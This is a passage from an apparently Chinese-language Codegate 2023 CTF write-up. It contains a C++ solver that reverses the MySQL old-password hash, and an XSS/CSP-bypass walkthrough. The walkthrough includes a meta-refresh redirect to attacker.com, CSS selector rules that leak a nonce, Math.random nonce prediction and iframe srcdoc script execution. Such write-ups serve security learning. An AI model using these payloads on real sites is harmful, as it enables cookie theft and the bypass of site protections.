class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stddef.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;thread&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;mutex&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unordered_map&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;atomic&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">oldpw_rev</span><span class=\"params\">(<span class=\"type\">uint32_t</span> *pnr, <span class=\"type\">uint32_t</span> *pnr2, <span class=\"type\">uint32_t</span> add,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cc, <span class=\"type\">unsigned</span> len)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nr, nr2;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> c, u, e, y;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (len == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    nr = *pnr;</span><br><span class=\"line\">    nr2 = *pnr2;</span><br><span class=\"line\">    c = cc[len - <span class=\"number\">1</span>];</span><br><span class=\"line\">    add -= c;</span><br><span class=\"line\"></span><br><span class=\"line\">    u = nr2 - nr;</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    y = nr;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (e = <span class=\"number\">0</span>; e &lt; <span class=\"number\">64</span>; e ++) &#123;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> z, g;</span><br><span class=\"line\"></span><br><span class=\"line\">        z = (e + add) * c;</span><br><span class=\"line\">        g = (e ^ z) &amp; <span class=\"number\">0x3F</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (g == (y &amp; <span class=\"number\">0x3F</span>)) &#123;</span><br><span class=\"line\">            <span class=\"type\">uint32_t</span> x;</span><br><span class=\"line\"></span><br><span class=\"line\">            x = e;</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">oldpw_rev</span>(&amp;nr, &amp;nr2, add, cc, len - <span class=\"number\">1</span>) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                *pnr = nr;</span><br><span class=\"line\">                *pnr2 = nr2;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">forward</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cc, <span class=\"type\">unsigned</span> len, <span class=\"type\">uint32_t</span> *nr, <span class=\"type\">uint32_t</span> *nr2, <span class=\"type\">uint32_t</span> *add)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> tmp;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cc[i] == <span class=\"string\">&#x27; &#x27;</span> || cc[i] == <span class=\"string\">&#x27;\\t&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp = cc[i];</span><br><span class=\"line\">        *nr ^= (((*nr &amp; <span class=\"number\">63</span>) + *add) * tmp) + (*nr &lt;&lt; <span class=\"number\">8</span>);</span><br><span class=\"line\">        *nr2 += (*nr2 &lt;&lt; <span class=\"number\">8</span> ) ^ *nr;</span><br><span class=\"line\">        *add += tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> mask = (((<span class=\"type\">uint32_t</span>)<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">31</span>) - (<span class=\"type\">uint32_t</span>)<span class=\"number\">1</span>); <span class=\"comment\">// 111....11, 31bits</span></span><br><span class=\"line\">    *nr &amp;= mask;</span><br><span class=\"line\">    *nr2 &amp;= mask;</span><br><span class=\"line\">    <span class=\"comment\">// printf(&quot;hash: %x %x\\n&quot;, *nr, *nr2);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">calc</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cc, <span class=\"type\">unsigned</span> len, <span class=\"type\">uint32_t</span> *nr, <span class=\"type\">uint32_t</span> *nr2)</span> </span>&#123;</span><br><span class=\"line\">\t*nr = <span class=\"number\">1345345333</span>;</span><br><span class=\"line\">\t*nr2 = <span class=\"number\">0x12345671</span>;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> add = <span class=\"number\">7</span>;</span><br><span class=\"line\">    forward(cc, len, nr, nr2, &amp;add);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Ans</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> buf[<span class=\"number\">6</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">pair_hash</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">template</span> &lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T1</span>, <span class=\"keyword\">class</span> <span class=\"title class_\">T2</span>&gt;</span><br><span class=\"line\">    <span class=\"function\">std::<span class=\"type\">size_t</span> <span class=\"title\">operator</span><span class=\"params\">()</span> <span class=\"params\">(<span class=\"type\">const</span> std::pair&lt;T1, T2&gt; &amp;pair)</span> <span class=\"type\">const</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::<span class=\"built_in\">hash</span>&lt;T1&gt;()(pair.first) ^ std::<span class=\"built_in\">hash</span>&lt;T2&gt;()(pair.second);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">bool</span> ok_maps[<span class=\"number\">65536</span>] = &#123;<span class=\"number\">0</span>&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nr, nr2;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> cp[] = <span class=\"string\">&quot;codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP_bEEE_KE03&quot;</span>;</span><br><span class=\"line\">    nr = <span class=\"number\">1345345333</span>;</span><br><span class=\"line\">\tnr2 = <span class=\"number\">0x12345671</span>;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> add = <span class=\"number\">7</span>;</span><br><span class=\"line\">    forward(cp, <span class=\"built_in\">strlen</span>((<span class=\"type\">char</span> *)cp), &amp;nr, &amp;nr2, &amp;add);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;nr: %x, nr2: %x, add: %x\\n&quot;</span>, nr, nr2, add);</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> fnr = nr, fnr2 = nr2, fadd = add;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> uadd = <span class=\"number\">127</span> * <span class=\"number\">6</span>, fuadd = fadd;</span><br><span class=\"line\">    fadd += uadd;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> cs[] = <span class=\"string\">&quot;i_love_you&#125;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    std::vector&lt;std::thread&gt; ths;</span><br><span class=\"line\">    std::mutex mtx;</span><br><span class=\"line\">    std::unordered_map&lt;std::pair&lt;<span class=\"type\">uint32_t</span>, <span class=\"type\">uint32_t</span>&gt;, Ans, pair_hash&gt; maps;</span><br><span class=\"line\">    std::atomic&lt;<span class=\"type\">int</span>&gt; cnter&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">500</span>; i &lt; <span class=\"number\">20000</span>; i++) &#123; <span class=\"comment\">// find possible `add` value </span></span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> pnr = <span class=\"number\">0x63686163</span>, pnr2 = <span class=\"number\">0x68613230</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> ans = <span class=\"built_in\">oldpw_rev</span>(&amp;pnr, &amp;pnr2, i, cs, <span class=\"number\">11</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ans != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        ok_maps[i] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">33</span>; i &lt; <span class=\"number\">127</span>; i++) &#123; </span><br><span class=\"line\">        ths.<span class=\"built_in\">emplace_back</span>([&amp;, i] &#123;</span><br><span class=\"line\">            std::vector&lt;std::pair&lt;std::pair&lt;<span class=\"type\">uint32_t</span>, <span class=\"type\">uint32_t</span>&gt;, Ans&gt;&gt; all;</span><br><span class=\"line\">            Ans cc;</span><br><span class=\"line\">            cc.buf[<span class=\"number\">5</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            cc.buf[<span class=\"number\">4</span>] = i;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> c = <span class=\"number\">33</span>; c &lt; <span class=\"number\">127</span>; c++) &#123;</span><br><span class=\"line\">                cc.buf[<span class=\"number\">3</span>] = c;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> d = <span class=\"number\">33</span>; d &lt; <span class=\"number\">127</span>; d++) &#123;</span><br><span class=\"line\">                    cc.buf[<span class=\"number\">2</span>] = d;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> a = <span class=\"number\">33</span>; a &lt; <span class=\"number\">127</span>; a++) &#123;</span><br><span class=\"line\">                        <span class=\"type\">int</span> sumer = fadd + i + c + d + a + <span class=\"number\">1207</span>;</span><br><span class=\"line\">                        cc.buf[<span class=\"number\">1</span>] = a;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> b = <span class=\"number\">33</span>; b &lt; <span class=\"number\">127</span>; b++) <span class=\"keyword\">if</span> (ok_maps[sumer + b]) &#123;</span><br><span class=\"line\">                            cc.buf[<span class=\"number\">0</span>] = b;</span><br><span class=\"line\">                            <span class=\"type\">uint32_t</span> pnr = <span class=\"number\">0x63686163</span>, pnr2 = <span class=\"number\">0x68613230</span>;</span><br><span class=\"line\">                            <span class=\"type\">int</span> ans = <span class=\"built_in\">oldpw_rev</span>(&amp;pnr, &amp;pnr2, fadd + i + c + d + a + b + <span class=\"number\">1207</span>, cs, <span class=\"number\">11</span>); <span class=\"comment\">// backward: suffix</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (ans != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                            ans = <span class=\"built_in\">oldpw_rev</span>(&amp;pnr, &amp;pnr2, fadd + i + c + d + a + b, cc.buf, <span class=\"number\">5</span>); <span class=\"comment\">// ... and extra 5 steps</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (ans != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                            ++cnter; </span><br><span class=\"line\">                            all.<span class=\"built_in\">emplace_back</span>(std::<span class=\"built_in\">make_pair</span>(std::<span class=\"built_in\">make_pair</span>(pnr, pnr2), cc)); <span class=\"comment\">// possible nr/nr2 pair, record it</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            std::lock_guard&lt;std::mutex&gt; <span class=\"built_in\">lock</span>(mtx);</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> &amp;&amp;p:all) &#123;</span><br><span class=\"line\">                maps[p.first] = p.second;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> &amp;&amp;th:ths) th.<span class=\"built_in\">join</span>();</span><br><span class=\"line\">    ths.<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;MITM&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, cnter.<span class=\"built_in\">load</span>());</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">33</span>; i &lt; <span class=\"number\">127</span>; i++) &#123; <span class=\"comment\">// forward</span></span><br><span class=\"line\">        ths.<span class=\"built_in\">emplace_back</span>([&amp;, i] &#123;</span><br><span class=\"line\">            <span class=\"type\">unsigned</span> <span class=\"type\">char</span> buf[<span class=\"number\">50</span>];</span><br><span class=\"line\">            buf[<span class=\"number\">0</span>] = i;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> c = <span class=\"number\">33</span>; c &lt; <span class=\"number\">127</span>; c++) &#123;</span><br><span class=\"line\">                buf[<span class=\"number\">1</span>] = c;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> d = <span class=\"number\">33</span>; d &lt; <span class=\"number\">127</span>; d++) &#123;</span><br><span class=\"line\">                    buf[<span class=\"number\">2</span>] = d;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> a = <span class=\"number\">33</span>; a &lt; <span class=\"number\">127</span>; a++) &#123;</span><br><span class=\"line\">                        buf[<span class=\"number\">3</span>] = a;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> b = <span class=\"number\">33</span>; b &lt; <span class=\"number\">127</span>; b++) &#123;</span><br><span class=\"line\">                            buf[<span class=\"number\">4</span>] = b;</span><br><span class=\"line\">                            <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> e = <span class=\"number\">33</span>; e &lt; <span class=\"number\">127</span>; e++) &#123;</span><br><span class=\"line\">                                buf[<span class=\"number\">5</span>] = e;</span><br><span class=\"line\">                                <span class=\"type\">int</span> re = uadd - i - c - d - a - b - e;</span><br><span class=\"line\">                                <span class=\"type\">int</span> iter = <span class=\"number\">6</span>;</span><br><span class=\"line\">                                <span class=\"keyword\">while</span> (re &gt;= <span class=\"number\">33</span>) &#123; <span class=\"comment\">// padding, to make the `add` value is `fadd`</span></span><br><span class=\"line\">                                    <span class=\"type\">int</span> tw = re;</span><br><span class=\"line\">                                    <span class=\"keyword\">if</span> (re &gt; <span class=\"number\">126</span>) &#123;</span><br><span class=\"line\">                                        tw = <span class=\"string\">&#x27;a&#x27;</span>;</span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                    buf[iter++] = tw;</span><br><span class=\"line\">                                    re -= tw;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (re != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                                buf[iter] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                                <span class=\"type\">uint32_t</span> nr = fnr, nr2 = fnr2, add = fuadd;</span><br><span class=\"line\">                                forward(buf, iter, &amp;nr, &amp;nr2, &amp;add);</span><br><span class=\"line\">                                <span class=\"keyword\">auto</span> cc2 = std::<span class=\"built_in\">make_pair</span>(nr, nr2);</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (maps.<span class=\"built_in\">find</span>(cc2) != maps.<span class=\"built_in\">end</span>()) &#123; <span class=\"comment\">// GOT!!!</span></span><br><span class=\"line\">                                    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s%s%s%s\\n&quot;</span>, cp, buf, maps[cc2].buf, cs);</span><br><span class=\"line\">                                    <span class=\"comment\">// exit(0);</span></span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> &amp;&amp;th:ths) th.<span class=\"built_in\">join</span>();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"Cha’s-Diary\"><a href=\"#Cha’s-Diary\" class=\"headerlink\" title=\"Cha’s Diary\"></a>Cha’s Diary</h2><p>非预期了。<br>储存型XSS，允许跨域。<br>有CSP策略保护，iframe被禁止加载，需要nonce来执行脚本：<br><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;nonce-&lt;%= nonce %&gt;&#39;; frame-src &#39;none&#39;; object-src &#39;none&#39;; style-src &#39;unsafe-inline&#39; https://unpkg.com&quot;&gt;</code><br>目标是偷cookie里的flag.<br>我们可以利用meta标签进行跳转：<br><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1; http://attacker.com&quot;&gt;</code><br>那么我们接下来要做的就是两步：获取nonce—&gt;执行js  </p>\n<h3 id=\"获取nonce\"><a href=\"#获取nonce\" class=\"headerlink\" title=\"获取nonce\"></a>获取nonce</h3><p>正解应该是通过注入CSS，用CSS匹配器匹配nonce属性，逐步获取nonce。<br>可能有人会好奇，每次页面刷新不是会重新生成nonce吗？但此题有一个特殊之处：传参方法是通过URL的<code>#</code>锚（哈希&#x2F;frame&#x2F;…）来传参，并通过页内js动态渲染。因此当前进后退时并不会刷新，<strong>而是调用浏览器缓存。因此nonce不会改变</strong>。<br>当时以为有<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce#description\">nonce hiding</a>这种东西，所以没有往下尝试，结果赛后发现这似乎是个饼并未实现……当然，我们的做法是直接在新标签页fetch并拿到页面内容正则匹配，根本就不经过浏览器过滤。<br>官方的做法就是使用CSS注入每次偷一位，具体做法见<a href=\"http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html\">how-to-bypass-csp-nonces-with-dom-xss</a><br>核心部分：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The summary of this attack is that it&#x27;s possible to create a CSS program that exfiltrates the values of HTML attributes character-by-character, simply by generating HTTP requests every time a CSS selector matches, and repeating consecutively. If you haven&#x27;t seen this working, take a look here. The way it works is very simple, it just creates a CSS attribute selector of the form:</span><br><span class=\"line\"></span><br><span class=\"line\">*[attribute^=&quot;a&quot;]&#123;background:url(&quot;record?match=a&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;b&quot;]&#123;background:url(&quot;record?match=b&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;c&quot;]&#123;background:url(&quot;record?match=c&quot;)&#125;</span><br><span class=\"line\">[...]</span><br><span class=\"line\"></span><br><span class=\"line\">And then, once we get a match, repeat with:</span><br><span class=\"line\">*[attribute^=&quot;aa&quot;]&#123;background:url(&quot;record?match=aa&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;ab&quot;]&#123;background:url(&quot;record?match=ab&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;ac&quot;]&#123;background:url(&quot;record?match=ac&quot;)&#125;</span><br><span class=\"line\">[...]</span><br><span class=\"line\"></span><br><span class=\"line\">Until it exfiltrates the complete attribute.</span><br></pre></td></tr></table></figure>\n<p>然而我们发现他只使用了<code>Math.random</code>来生成随机nonce，这完全是可以预测的：<a href=\"https://github.com/PwnFunction/v8-randomness-predictor\">https://github.com/PwnFunction/v8-randomness-predictor</a><br><strong>于是我们新开一个标签页然后多次fetch阅读文章页面拿一堆nonce给预测器，直接就能知道下一个nonce.</strong>  </p>\n<h3 id=\"执行JS\"><a href=\"#执行JS\" class=\"headerlink\" title=\"执行JS\"></a>执行JS</h3><p>nonce已知之后可以直接在自己VPS上发送请求创建笔记。<br>接下来要让受害者加载页面才行。这个只需要看<code>share_read.js</code>就会发现触发<code>hashchange</code>事件即可。由于缓存（前进后退缓存，bfcache）的存在，我们可以在已知nonce的标签页随便开个页面然后<code>extra.history.go(-1);</code>，并修改hash值便能再次触发post加载，让已经被回调函数删掉的事件监听器在重新运行的js中焕发第二春。<br>这时我们发现单纯插入script标签并不能被执行，因为js脚本是往页面DOM节点写入<code>innerText</code>而已。<br>经过一番神秘的摸索，大战MDN的manual，我们发现了一个神奇的属性：<code>&lt;iframe srcdoc=&quot;...&quot;&gt;</code><br>在<a href=\"https://csplite.com/csp/test188/\">CSP测试网站</a>中是这么说的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content Security Policy: the srcdoc attribute in the iframe tag is not governed by frame-src, but its content is blocked by other directives of the parent page</span><br></pre></td></tr></table></figure>\n\n<p>也就是插入时就会执行。至此，我们得以执行插入的js代码。  </p>\n<h3 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h3><p>官方idea来自这篇文章，也是场上找到过的材料：<a href=\"https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss\">Chrome Cache to XSS</a><br>其他一些很有用的材料：<a href=\"http://sebastian-lekies.de/csp/bypasses.php\">Collection of CSP bypasses</a><br>CSP相关测试的网站：<a href=\"https://csplite.com/csp/\">https://csplite.com/csp/</a><br>随机数预测解法的完整服务端代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span 